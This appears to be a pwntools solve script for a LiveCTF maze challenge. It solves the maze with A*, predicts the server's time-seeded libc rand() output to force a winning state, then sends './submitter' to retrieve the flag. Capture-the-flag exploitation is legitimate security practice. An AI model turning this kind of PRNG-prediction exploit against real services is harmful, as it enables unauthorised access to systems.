#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import ctypes

libc = ctypes.CDLL("libc.so.6")


# exe = context.binary = ELF('challenge')

gdbscript = '''
# tbreak main
brva 0x1b09
brva 0x1fc0
continue
'''.format(**locals())

# -- Exploit goes here --


TIME = libc.time(0)

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
io = remote(HOST, int(PORT))

io.recvuntil(b": ")



io.sendline(b"a")
io.recvline()
io.recvline()
maze = []
for _ in range(29):
    maze.append(io.recvline().strip())

for y,row in enumerate(maze):
    for x,space in enumerate(row):
        if space == b'@'[0]: begin = (y,x)
        if space == b'*'[0]: end = (y,x)

def solve(maze):
    import networkx as nx

    G = nx.Graph()
    for i in range(29):
        for j in range(29):
            G.add_node((i,j))
            if i >0:
                G.add_edge((i-1,j),(i,j))
            if j>0:
                G.add_edge((i,j),(i,j-1))

    for i in range(29):
        for j in range(29):
            if maze[i][j]== b'#'[0]:
                G.remove_node((i,j))

    return nx.algorithms.astar_path(G,begin,end)

soln = b''
path = solve(maze)
curr = path[0]
for z,w in path[1:]:
    y,x = curr
    if z-y == 1: soln+=b's'
    elif z-y == -1: soln+=b'n'
    elif w-x == 1: soln+=b'e'
    elif w-x == -1: soln+=b'w'
    curr=(z,w)


def get_rand_for_path(path):
    libc.srand(TIME)
    for _ in range(590+len(path)):
        libc.rand()
    return libc.rand()


b = bytes([soln[-2]])
opposite = {b's':b'n',b'n':b's',b'e':b'w',b'w':b'e'}[b]

while get_rand_for_path(soln) % 1213 != 1212:
    soln = soln[:-1]+(opposite+b)+bytes([soln[-1]])

for m in soln:
    io.sendlineafter(b": ", bytes([m]))

io.sendlineafter(b"Congratulations! You have solved the maze!\n", b"./submitter")
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

